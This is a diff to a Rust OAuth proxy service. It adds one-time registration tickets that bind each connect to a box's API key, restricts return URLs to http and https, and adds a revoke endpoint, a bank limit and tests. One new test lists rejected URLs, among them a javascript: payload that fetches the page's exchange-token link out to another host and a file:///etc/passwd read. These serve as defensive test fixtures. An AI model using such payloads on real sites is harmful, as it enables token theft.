@@ -4,6 +4,9 @@
 //! virtues-api. Contract is unchanged, so the home server just repoints
 //! `VIRTUES_OAUTH_PROXY_URL` at virtues-api:
 //!
+//!   POST /{provider}/sessions         — the home server registers a connect,
+//!                                       server-to-server with its key, and
+//!                                       gets a one-time ticket
 //!   GET  /{provider}/start            — kick off; redirect to the provider
 //!   GET  /{provider}/callback         — exchange the code, sign a short-lived
 //!                                       exchange_token, bounce to return_url
@@ -36,10 +39,12 @@ use crate::AppState;
 
 pub fn router() -> Router<Arc<AppState>> {
     Router::new()
+        .route("/:provider/sessions", post(register))
         .route("/:provider/start", get(start))
         .route("/:provider/callback", get(callback))
         .route("/:provider/exchange/:token", post(exchange))
         .route("/:provider/refresh", post(refresh))
+        .route("/:provider/revoke", post(revoke))
 }
 
 // ─────────────────────────────────────────────────────────────────────────
@@ -130,13 +135,17 @@ fn exchange_secret() -> Result<String, String> {
 /// `oauth_session` — so this guard decides what may be *stored*, and nothing
 /// the browser says later can change where the token goes.
 ///
-/// It still matches on the *shape* of an address rather than on the identity
-/// of the box that started the flow: `/start` is a browser navigation, so the
-/// box cannot put its api_key on it without exposing the key. Binding the
-/// session to a box (the box registers it server-to-server first, then sends
-/// the browser) is the remaining step, and needs a box release. Until then
-/// this list should be exactly as wide as the deployments we actually ship,
-/// and no wider.
+/// It matches on the *shape* of an address, not on the identity of the box
+/// that started the flow. The identity check is the ticket: a box registers
+/// the connect at `/sessions` with its key, and `/exchange` then requires that
+/// key (see [`register`]). This list should still be exactly as wide as the
+/// deployments we actually ship, and no wider, because boxes that predate
+/// tickets reach `/start` without one.
+///
+/// Only `http` and `https` pass. The address becomes a link on the LAN
+/// continue page, and a `javascript:` address with a `.local` host would run
+/// script on our page when the owner clicks it. That script could read the
+/// exchange token out of the link.
 ///
 /// Private IPv4/IPv6 is in the list because the box hands those out itself:
 /// the pair QR carries the raw LAN IP on purpose (phones fumble mDNS), and
@@ -147,10 +156,13 @@ fn exchange_secret() -> Result<String, String> {
 /// Public addresses stay rejected, which is what keeps an attacker's own server
 /// out. Note the redirect is issued to the *browser* — the proxy never dials a
 /// private address itself, so widening this opens no SSRF surface.
-fn is_valid_return_url(url: &str) -> bool {
+pub(crate) fn is_valid_return_url(url: &str) -> bool {
     let Ok(parsed) = reqwest::Url::parse(url) else {
         return false;
     };
+    if !matches!(parsed.scheme(), "http" | "https") {
+        return false;
+    }
     let Some(host) = parsed.host_str() else {
         return false;
     };
@@ -334,6 +346,119 @@ fn lan_continue_page(target: &str) -> axum::response::Response {
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+// POST /{provider}/sessions
+// ─────────────────────────────────────────────────────────────────────────
+
+/// How long a registered connect waits for the owner's browser to reach
+/// `/start`. The box opens the browser right after registering, so seconds are
+/// normal. The window is short because a ticket link sent to someone else is
+/// the one way left to misuse a ticket: an attacker with their own key could
+/// register a connect to their own server and send the owner its link.
+const OAUTH_TICKET_TTL_SECS: i64 = 300;
+
+#[derive(serde::Deserialize)]
+struct RegisterBody {
+    return_url: String,
+    state: String,
+}
+
+/// Register a connect before the owner's browser starts it. The box calls this
+/// server-to-server with its key, then sends the browser to
+/// `/{provider}/start?ticket=…`. The session that ticket opens remembers the
+/// key, and `/exchange` serves only that key, so an exchange token that reached
+/// someone else's address is worthless to them.
+async fn register(
+    State(state): State<Arc<AppState>>,
+    Path(provider): Path<String>,
+    headers: HeaderMap,
+    Json(body): Json<RegisterBody>,
+) -> axum::response::Response {
+    let refuse = |status: StatusCode, code: &str, msg: &str| {
+        (status, Json(json!({ "error": msg, "code": code }))).into_response()
+    };
+    if provider_cfg(&provider).is_none() {
+        return refuse(StatusCode::NOT_FOUND, "unknown_provider", "unknown provider");
+    }
+    if !is_valid_return_url(&body.return_url) {
+        return refuse(StatusCode::BAD_REQUEST, "invalid_return_url", "invalid return_url");
+    }
+    if body.state.is_empty() {
+        return refuse(StatusCode::BAD_REQUEST, "missing_state", "missing state");
+    }
+    let Some(key) = caller_api_key(&headers) else {
+        use virtues_helpers::error::StructuredError;
+        let e = BearerError::MissingHeader;
+        return refuse(StatusCode::UNAUTHORIZED, e.code(), &e.message());
+    };
+    match resolve_box_key(&state.db, &state.blocklist, &key).await {
+        Ok(_) => {}
+        Err(BearerError::Internal(e)) => {
+            tracing::error!(provider = %provider, error = %e, "oauth register key lookup failed");
+            return refuse(StatusCode::INTERNAL_SERVER_ERROR, "internal", "key lookup failed");
+        }
+        Err(refused) => {
+            use virtues_helpers::error::StructuredError;
+            tracing::warn!(provider = %provider, code = refused.code(), "oauth register refused");
+            let status = StatusCode::from_u16(refused.status()).unwrap_or(StatusCode::UNAUTHORIZED);
+            return refuse(status, refused.code(), &refused.message());
+        }
+    }
+    let ticket = format!("{}{}", uuid::Uuid::new_v4().simple(), uuid::Uuid::new_v4().simple());
+    if let Err(e) =
+        put_oauth_ticket(&state.db, &ticket, &provider, &body.return_url, &body.state, &key_hash(&key)).await
+    {
+        tracing::error!(error = %e, "oauth ticket store failed");
+        return refuse(StatusCode::INTERNAL_SERVER_ERROR, "internal", "could not register the connect");
+    }
+    Json(json!({ "ticket": ticket, "expires_in": OAUTH_TICKET_TTL_SECS })).into_response()
+}
+
+async fn put_oauth_ticket(
+    db: &sqlx::PgPool,
+    ticket: &str,
+    provider: &str,
+    return_url: &str,
+    rust_state: &str,
+    key_hash: &[u8],
+) -> Result<(), sqlx::Error> {
+    // This function is the table's only inserter, so it sweeps expired rows.
+    let _ = sqlx::query("DELETE FROM oauth_ticket WHERE expires_at < now()")
+        .execute(db)
+        .await;
+    sqlx::query(
+        "INSERT INTO oauth_ticket (ticket, provider, return_url, rust_state, key_hash, expires_at)
+         VALUES ($1, $2, $3, $4, $5, now() + make_interval(secs => $6))",
+    )
+    .bind(ticket)
+    .bind(provider)
+    .bind(return_url)
+    .bind(rust_state)
+    .bind(key_hash)
+    .bind(OAUTH_TICKET_TTL_SECS as f64)
+    .execute(db)
+    .await
+    .map(|_| ())
+}
+
+/// Single-use: the ticket is deleted as it is read, so a second visit to the
+/// same `/start` link finds nothing.
+async fn take_oauth_ticket(
+    db: &sqlx::PgPool,
+    ticket: &str,
+    provider: &str,
+) -> Result<Option<(String, String, Vec<u8>)>, sqlx::Error> {
+    sqlx::query_as(
+        "DELETE FROM oauth_ticket
+          WHERE ticket = $1 AND provider = $2 AND expires_at > now()
+          RETURNING return_url, rust_state, key_hash",
+    )
+    .bind(ticket)
+    .bind(provider)
+    .fetch_optional(db)
+    .await
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 // GET /{provider}/start
 // ─────────────────────────────────────────────────────────────────────────
 
@@ -345,16 +470,46 @@ async fn start(
     let Some(cfg) = provider_cfg(&provider) else {
         return err(StatusCode::NOT_FOUND, "unknown provider");
     };
-    let (Some(return_url), Some(rust_state)) = (q.get("return_url"), q.get("state")) else {
-        return err(StatusCode::BAD_REQUEST, "missing return_url or state");
+    // A registered connect names only its ticket. Where to return, the box's
+    // state and whose key registered it all come from the row `/sessions`
+    // wrote. Without a ticket this is a box that predates `/sessions`.
+    let (return_url, rust_state, key_hash) = if let Some(ticket) = q.get("ticket") {
+        match take_oauth_ticket(&state.db, ticket, &provider).await {
+            Ok(Some((return_url, rust_state, key_hash))) => (return_url, rust_state, Some(key_hash)),
+            Ok(None) => {
+                return err(
+                    StatusCode::BAD_REQUEST,
+                    "This connect link has expired or was already used. Start connecting again from Virtues.",
+                )
+            }
+            Err(e) => {
+                tracing::error!(error = %e, "oauth ticket lookup failed");
+                return err(StatusCode::INTERNAL_SERVER_ERROR, "could not start oauth session");
+            }
+        }
+    } else {
+        let (Some(return_url), Some(rust_state)) = (q.get("return_url"), q.get("state")) else {
+            return err(StatusCode::BAD_REQUEST, "missing return_url or state");
+        };
+        if require_registered() {
+            tracing::warn!(provider = %provider, code = "unregistered_start", "oauth start refused");
+            return err(
+                StatusCode::BAD_REQUEST,
+                "Update your Virtues server to connect this source. It started this connect without registering it first.",
+            );
+        }
+        // Counted so we can tell when the fleet has moved and the flag can flip.
+        tracing::info!(provider = %provider, code = "unregistered_start", "oauth start without a ticket");
+        (return_url.clone(), rust_state.clone(), None)
     };
+    let (return_url, rust_state) = (return_url.as_str(), rust_state.as_str());
     if !is_valid_return_url(return_url) {
         return err(StatusCode::BAD_REQUEST, "invalid return_url");
     }
     // Plaid carries its session server-side (see the Hosted Link note below),
     // so it never gets a `state` blob to round-trip.
     if provider == "plaid" {
-        return plaid_start(&state, &cfg, return_url, rust_state).await;
+        return plaid_start(&state, &cfg, return_url, rust_state, key_hash.as_deref()).await;
     }
     // The session row IS the state. The provider echoes `session_id` back
     // verbatim; everything else — where to return, the box's own signed
@@ -368,6 +523,7 @@ async fn start(
         return_url,
         rust_state,
         pkce.as_ref().map(|(v, _)| v.as_str()),
+        key_hash.as_deref(),
     )
     .await
     {
@@ -490,6 +646,7 @@ async fn plaid_start(
     cfg: &ProviderCfg,
     return_url: &str,
     rust_state: &str,
+    key_hash: Option<&[u8]>,
 ) -> axum::response::Response {
     let body = plaid_link_token_body(cfg, &cfg.redirect_uri);
     let resp = state
@@ -516,7 +673,8 @@ async fn plaid_start(
     };
 
     let session_id = uuid::Uuid::new_v4().to_string();
-    if let Err(e) = put_link_session(&state.db, &session_id, link_token, return_url, rust_state).await
+    if let Err(e) =
+        put_link_session(&state.db, &session_id, link_token, return_url, rust_state, key_hash).await
     {
         tracing::error!(error = %e, "plaid link session store failed");
         return err(StatusCode::INTERNAL_SERVER_ERROR, "could not start plaid session");
@@ -561,6 +719,7 @@ async fn put_link_session(
     link_token: &str,
     return_url: &str,
     rust_state: &str,
+    key_hash: Option<&[u8]>,
 ) -> Result<(), sqlx::Error> {
     // Opportunistic sweep: this table's only writer is this function, so
     // expired rows are collected here instead of by a cron nobody would own.
@@ -568,29 +727,33 @@ async fn put_link_session(
         .execute(db)
         .await;
     sqlx::query(
-        "INSERT INTO plaid_link_session (session_id, link_token, return_url, rust_state, expires_at)
-         VALUES ($1, $2, $3, $4, now() + make_interval(secs => $5))",
+        "INSERT INTO plaid_link_session (session_id, link_token, return_url, rust_state, key_hash, expires_at)
+         VALUES ($1, $2, $3, $4, $5, now() + make_interval(secs => $6))",
     )
     .bind(session_id)
     .bind(link_token)
     .bind(return_url)
     .bind(rust_state)
+    .bind(key_hash)
     .bind(PLAID_LINK_TTL_SECS as f64)
     .execute(db)
     .await
     .map(|_| ())
 }
 
+/// `(link_token, return_url, rust_state, key_hash)` from `plaid_link_session`.
+type LinkSession = (String, String, String, Option<Vec<u8>>);
+
 /// Single-use read: the row is deleted as it is returned, so a replayed
 /// completion redirect can't re-exchange the session.
 async fn take_link_session(
     db: &sqlx::PgPool,
     session_id: &str,
-) -> Result<Option<(String, String, String)>, sqlx::Error> {
+) -> Result<Option<LinkSession>, sqlx::Error> {
     sqlx::query_as(
         "DELETE FROM plaid_link_session
           WHERE session_id = $1 AND expires_at > now()
-          RETURNING link_token, return_url, rust_state",
+          RETURNING link_token, return_url, rust_state, key_hash",
     )
     .bind(session_id)
     .fetch_optional(db)
@@ -637,6 +800,7 @@ async fn put_oauth_session(
     return_url: &str,
     rust_state: &str,
     code_verifier: Option<&str>,
+    key_hash: Option<&[u8]>,
 ) -> Result<(), sqlx::Error> {
     // Opportunistic sweep, as for plaid_link_session: this is the table's
     // only inserter, so expired rows are collected here instead of by a cron
@@ -646,14 +810,15 @@ async fn put_oauth_session(
         .await;
     sqlx::query(
         "INSERT INTO oauth_session
-            (session_id, provider, return_url, rust_state, code_verifier, expires_at)
-         VALUES ($1, $2, $3, $4, $5, now() + make_interval(secs => $6))",
+            (session_id, provider, return_url, rust_state, code_verifier, key_hash, expires_at)
+         VALUES ($1, $2, $3, $4, $5, $6, now() + make_interval(secs => $7))",
     )
     .bind(session_id)
     .bind(provider)
     .bind(return_url)
     .bind(rust_state)
     .bind(code_verifier)
+    .bind(key_hash)
     .bind(OAUTH_SESSION_TTL_SECS as f64)
     .execute(db)
     .await
@@ -715,10 +880,31 @@ async fn consume_exchange(db: &sqlx::PgPool, sig: &str) -> Result<bool, sqlx::Er
     Ok(n == 1)
 }
 
+/// Whose key registered the session that minted this sig. The outer `None` is
+/// a sig with no live, unspent session; `Some(None)` is a session started
+/// without a ticket, by a box that predates `/sessions`.
+async fn exchange_owner(db: &sqlx::PgPool, sig: &str) -> Result<Option<Option<Vec<u8>>>, sqlx::Error> {
+    sqlx::query_scalar(
+        "SELECT key_hash FROM oauth_session
+          WHERE exchange_sig = $1 AND consumed_at IS NULL AND expires_at > now()",
+    )
+    .bind(sig)
+    .fetch_optional(db)
+    .await
+}
+
+/// Whether `/start` and `/exchange` refuse connects that no box registered.
+/// Off while released boxes still start connects without a ticket; the
+/// `unregistered_start` log line counts them. Turn it on with
+/// `OAUTH_REQUIRE_REGISTERED=1` once that count is near zero.
+fn require_registered() -> bool {
+    matches!(env("OAUTH_REQUIRE_REGISTERED").as_str(), "1" | "true")
+}
+
 /// The caller's box key, if it sent one. Every box release since v0.1.1 sends
-/// it on `/exchange` and `/refresh`. `/refresh` requires it
-/// ([`check_caller_key`]); `/exchange` does not check it yet, and the browser
-/// routes (`/start`, `/callback`) cannot carry it.
+/// it on `/exchange` and `/refresh`. `/sessions` and `/refresh` require it
+/// ([`check_caller_key`]). `/exchange` requires the key that registered the
+/// session, and the browser routes (`/start`, `/callback`) cannot carry it.
 fn caller_api_key(headers: &HeaderMap) -> Option<String> {
     headers
         .get("x-virtues-api-key")
@@ -925,7 +1111,7 @@ async fn plaid_callback(
     // No cookie or no live row: we don't know which box started this, so there
     // is nowhere to bounce back to. Explain it instead of 400-ing into a blank
     // page — the user is sitting in front of this.
-    let Some((session_id, (link_token, return_url, rust_state))) = session else {
+    let Some((session_id, (link_token, return_url, rust_state, key_hash))) = session else {
         return plaid_session_lost_page();
     };
     if !is_valid_return_url(&return_url) {
@@ -1007,7 +1193,15 @@ async fn plaid_callback(
     // unspendable: bounce as a failure rather than hand over a dead token and
     // let the box discover it one HTTP call later.
     let sig = token.rsplit('.').next().unwrap_or_default();
-    if let Err(e) = put_plaid_exchange_session(&state.db, &session_id, &return_url, &rust_state, sig).await
+    if let Err(e) = put_plaid_exchange_session(
+        &state.db,
+        &session_id,
+        &return_url,
+        &rust_state,
+        sig,
+        key_hash.as_deref(),
+    )
+    .await
     {
         tracing::error!(error = %e, "plaid exchange session store failed");
         return finish_plaid(&return_url, &rust_state, "error", "token_exchange_failed", cfg);
@@ -1035,6 +1229,7 @@ async fn put_plaid_exchange_session(
     return_url: &str,
     rust_state: &str,
     sig: &str,
+    key_hash: Option<&[u8]>,
 ) -> Result<(), sqlx::Error> {
     // Second inserter into this table, so it sweeps too: a fleet that only
     // ever connects banks would otherwise never collect its own expired rows.
@@ -1043,13 +1238,14 @@ async fn put_plaid_exchange_session(
         .await;
     sqlx::query(
         "INSERT INTO oauth_session
-            (session_id, provider, return_url, rust_state, exchange_sig, expires_at)
-         VALUES ($1, 'plaid', $2, $3, $4, now() + make_interval(secs => $5))",
+            (session_id, provider, return_url, rust_state, exchange_sig, key_hash, expires_at)
+         VALUES ($1, 'plaid', $2, $3, $4, $5, now() + make_interval(secs => $6))",
     )
     .bind(session_id)
     .bind(return_url)
     .bind(rust_state)
     .bind(sig)
+    .bind(key_hash)
     .bind(OAUTH_SESSION_TTL_SECS as f64)
     .execute(db)
     .await
@@ -1308,6 +1504,7 @@ fn plaid_session_lost_page() -> axum::response::Response {
 async fn exchange(
     State(state): State<Arc<AppState>>,
     Path((provider, token)): Path<(String, String)>,
+    headers: HeaderMap,
 ) -> axum::response::Response {
     if provider_cfg(&provider).is_none() {
         return err(StatusCode::NOT_FOUND, "unknown provider");
@@ -1327,6 +1524,36 @@ async fn exchange(
     // *unforgeable*; this makes it *single-use* — the five-minute window was
     // wide enough for anything that saw the redirect URL to replay it.
     let sig = token.rsplit('.').next().unwrap_or_default();
+    // Only the box that registered the connect may spend its token. The token
+    // travels through the browser and may reach whatever address the browser
+    // was sent to, so holding it proves nothing; the registering key does.
+    // Checked before the spend, so a refused caller does not burn the owner's
+    // token.
+    match exchange_owner(&state.db, sig).await {
+        Ok(Some(Some(expected))) => {
+            let presented = caller_api_key(&headers).map(|k| key_hash(&k));
+            if presented.as_deref() != Some(expected.as_slice()) {
+                tracing::warn!(provider = %provider, code = "wrong_box_key", "oauth exchange refused");
+                return err(
+                    StatusCode::FORBIDDEN,
+                    "this exchange_token belongs to the server that registered the connect",
+                );
+            }
+        }
+        Ok(Some(None)) => {
+            if require_registered() {
+                tracing::warn!(provider = %provider, code = "unregistered_exchange", "oauth exchange refused");
+                return err(StatusCode::FORBIDDEN, "this connect was not registered by a server");
+            }
+        }
+        // Spent, expired or never bound: `consume_exchange` below refuses it
+        // with the usual answer.
+        Ok(None) => {}
+        Err(e) => {
+            tracing::error!(error = %e, "oauth exchange owner lookup failed");
+            return err(StatusCode::INTERNAL_SERVER_ERROR, "exchange bookkeeping failed");
+        }
+    }
     match consume_exchange(&state.db, sig).await {
         Ok(true) => {}
         Ok(false) => {
@@ -1338,6 +1565,11 @@ async fn exchange(
             return err(StatusCode::INTERNAL_SERVER_ERROR, "exchange bookkeeping failed");
         }
     }
+    if provider == "plaid" {
+        if let Some(refused) = admit_bank(&state, &headers, &claims.secrets, &claims.metadata).await {
+            return refused;
+        }
+    }
     Json(json!({
         "secrets": claims.secrets,
         "metadata": claims.metadata,
@@ -1345,6 +1577,114 @@ async fn exchange(
         "scopes": claims.scopes,
     }))
     .into_response()
+}
+
+/// Count a newly linked bank against the account's limit (`crate::banks`).
+/// `Some` is the refusal to return: the account is at the limit, and the bank
+/// has been removed from Plaid so it never bills. `None` lets the exchange
+/// finish.
+///
+/// A box that sent no key, or a key we did not issue, is not counted: every
+/// box release since v0.1.1 sends one, and a box without a live subscription
+/// cannot read bank data through `routes/plaid.rs` anyway. A failed lookup or
+/// insert also lets the bank through, because refusing would lose a bank the
+/// owner just linked over a fault of ours; it is logged.
+async fn admit_bank(
+    state: &AppState,
+    headers: &HeaderMap,
+    secrets: &Value,
+    metadata: &Value,
+) -> Option<axum::response::Response> {
+    let key = caller_api_key(headers)?;
+    let account = match resolve_box_key(&state.db, &state.blocklist, &key).await {
+        Ok(k) => k.account_id,
+        Err(BearerError::Internal(e)) => {
+            tracing::error!(error = %e, "plaid exchange key lookup failed; bank not counted");
+            return None;
+        }
+        Err(_) => return None,
+    };
+    let Some(item_id) = metadata.get("item_id").and_then(|v| v.as_str()) else {
+        tracing::warn!("plaid exchange without an item_id; bank not counted");
+        return None;
+    };
+    match crate::banks::admit(&state.db, &account, item_id, crate::banks::max_banks()).await {
+        Ok(crate::banks::Admit::Admitted) => None,
+        Ok(crate::banks::Admit::AtLimit { max }) => {
+            let token = secrets.get("access_token").and_then(|v| v.as_str()).unwrap_or_default();
+            if !super::plaid::remove_refused(state, token).await {
+                tracing::error!("bank refused at the limit, but Plaid did not confirm removing it");
+            }
+            Some(
+                (
+                    StatusCode::FORBIDDEN,
+                    Json(json!({
+                        "error": format!("This account already has {max} linked banks, the most a subscription covers."),
+                        "code": "bank_limit",
+                    })),
+                )
+                    .into_response(),
+            )
+        }
+        Err(e) => {
+            tracing::error!(error = %e, "counting a linked bank failed; bank not counted");
+            None
+        }
+    }
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+// POST /{provider}/revoke
+// ─────────────────────────────────────────────────────────────────────────
+
+#[derive(serde::Deserialize)]
+struct RevokeBody {
+    #[serde(default)]
+    secrets: Value,
+}
+
+/// The box lets go of a grant it got through this proxy: its owner
+/// disconnected the source, or the box released it after a lapsed
+/// subscription. The box calls this for every proxied source and knows
+/// nothing about which providers need it; the provider's quirk lives here.
+///
+/// - plaid: remove the bank from Plaid, which ends its monthly fee, and free
+///   its place under the account's bank limit.
+/// - every other provider: nothing is held here, so there is nothing to do.
+///
+/// Needs only a box key we issued, not a live wallet, so a lapsed box can
+/// still clean up.
+async fn revoke(
+    State(state): State<Arc<AppState>>,
+    Path(provider): Path<String>,
+    headers: HeaderMap,
+    Json(body): Json<RevokeBody>,
+) -> axum::response::Response {
+    if provider_cfg(&provider).is_none() {
+        return err(StatusCode::NOT_FOUND, "unknown provider");
+    }
+    let Some(key) = caller_api_key(&headers) else {
+        return refresh_err(StatusCode::UNAUTHORIZED, "missing_key", "box key required");
+    };
+    let account = match resolve_box_key(&state.db, &state.blocklist, &key).await {
+        Ok(k) => k.account_id,
+        Err(BearerError::Internal(e)) => {
+            tracing::error!(provider = %provider, error = %e, "oauth revoke key lookup failed");
+            return refresh_err(StatusCode::INTERNAL_SERVER_ERROR, "internal", "key lookup failed");
+        }
+        Err(e) => {
+            use virtues_helpers::error::StructuredError;
+            tracing::warn!(provider = %provider, code = e.code(), "oauth revoke refused");
+            return refresh_err(StatusCode::UNAUTHORIZED, e.code(), "box key not recognized");
+        }
+    };
+    match provider.as_str() {
+        "plaid" => {
+            let token = body.secrets.get("access_token").and_then(|v| v.as_str()).unwrap_or_default();
+            super::plaid::remove_item(&state, &account, token).await
+        }
+        _ => StatusCode::NO_CONTENT.into_response(),
+    }
 }
 
 // ─────────────────────────────────────────────────────────────────────────
@@ -1613,6 +1953,24 @@ mod tests {
             "https://virtues.com.evil.com/oauth/callback",
             "https://notvirtues.com/oauth/callback",
             "not a url",
+        ] {
+            assert!(!is_valid_return_url(url), "should reject {url}");
+        }
+    }
+
+    #[test]
+    fn rejects_every_scheme_but_http_and_https() {
+        // The return address becomes a link on the LAN continue page. A
+        // `javascript:` address with an allowed host would run on our page
+        // and could read the exchange token out of that link.
+        for url in [
+            "javascript://evil.local/%0afetch('https://example.com/'+document.links[0].href)",
+            "javascript://localhost/%0aalert(1)",
+            "javascript://192.168.1.40/%0aalert(1)",
+            "data://virtues.local/text/html,hi",
+            "file://localhost/etc/passwd",
+            "ftp://virtues.local/oauth/callback",
+            "virtues://localhost/oauth/callback",
         ] {
             assert!(!is_valid_return_url(url), "should reject {url}");
         }
@@ -1910,6 +2268,7 @@ mod tests {
             "http://192.168.1.40:7117/oauth/callback",
             "rust-state",
             sig,
+            None,
         )
         .await
         .expect("record the sig");
@@ -1920,5 +2279,67 @@ mod tests {
             !consume_exchange(&pool, "never-minted").await.unwrap(),
             "a sig that was never bound must not spend"
         );
+    }
+    /// A ticket opens one `/start`, for its own provider, and carries the
+    /// registering key onto the session, which `/exchange` then checks.
+    #[sqlx::test]
+    async fn a_ticket_binds_the_session_to_the_registering_key(pool: sqlx::PgPool) {
+        let ret = "http://192.168.1.40:7117/oauth/callback";
+        let hash = key_hash("box-key-ticket");
+        put_oauth_ticket(&pool, "ticket-1", "google", ret, "rust-state", &hash)
+            .await
+            .expect("store the ticket");
+
+        assert!(
+            take_oauth_ticket(&pool, "ticket-1", "notion").await.unwrap().is_none(),
+            "a ticket must not open another provider's connect"
+        );
+        let (return_url, rust_state, key) = take_oauth_ticket(&pool, "ticket-1", "google")
+            .await
+            .unwrap()
+            .expect("the ticket opens its own provider's connect");
+        assert_eq!((return_url.as_str(), rust_state.as_str()), (ret, "rust-state"));
+        assert_eq!(key, hash);
+        assert!(
+            take_oauth_ticket(&pool, "ticket-1", "google").await.unwrap().is_none(),
+            "a ticket opens one connect"
+        );
+
+        put_oauth_session(&pool, "sess-reg", "google", ret, "rust-state", None, Some(&key))
+            .await
+            .expect("open the session");
+        assert!(bind_exchange_sig(&pool, "sess-reg", "sig-reg").await.unwrap());
+        assert_eq!(exchange_owner(&pool, "sig-reg").await.unwrap(), Some(Some(hash)));
+
+        // A box that predates `/sessions`: the session has no owner.
+        put_oauth_session(&pool, "sess-old", "google", ret, "rust-state", None, None)
+            .await
+            .expect("open the session");
+        assert!(bind_exchange_sig(&pool, "sess-old", "sig-old").await.unwrap());
+        assert_eq!(exchange_owner(&pool, "sig-old").await.unwrap(), Some(None));
+
+        // A spent token has no owner to check; `consume_exchange` refuses it.
+        assert!(consume_exchange(&pool, "sig-reg").await.unwrap());
+        assert_eq!(exchange_owner(&pool, "sig-reg").await.unwrap(), None);
+    }
+
+    /// Plaid carries the key through `plaid_link_session` to the row its
+    /// callback writes.
+    #[sqlx::test]
+    async fn plaid_carries_the_registering_key(pool: sqlx::PgPool) {
+        let ret = "http://192.168.1.40:7117/oauth/callback";
+        let hash = key_hash("box-key-plaid");
+        put_link_session(&pool, "sess-link", "link-token", ret, "rust-state", Some(&hash))
+            .await
+            .expect("store the link session");
+        let (_, _, _, key) = take_link_session(&pool, "sess-link")
+            .await
+            .unwrap()
+            .expect("the link session is there");
+        assert_eq!(key.as_deref(), Some(hash.as_slice()));
+        put_plaid_exchange_session(&pool, "sess-link", ret, "rust-state", "sig-plaid", key.as_deref())
+            .await
+            .expect("record the sig");
+        assert_eq!(exchange_owner(&pool, "sig-plaid").await.unwrap(), Some(Some(hash)));
     }
 }
